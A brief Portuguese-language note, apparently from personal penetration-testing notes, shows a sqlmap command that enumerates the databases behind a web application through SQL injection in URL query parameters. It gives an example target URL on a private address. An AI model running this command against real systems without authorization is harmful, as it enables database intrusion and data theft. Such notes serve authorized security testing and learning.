Sqlmap para poder retornar os bancos de dados que tem na aplicao atraves da URL com parametros (query params)

```
sqlmap -r URLs.req --batch --dbs
``` 
Exemplo: http://172.16.1.245/produtos.php?mprod=0&prod=863

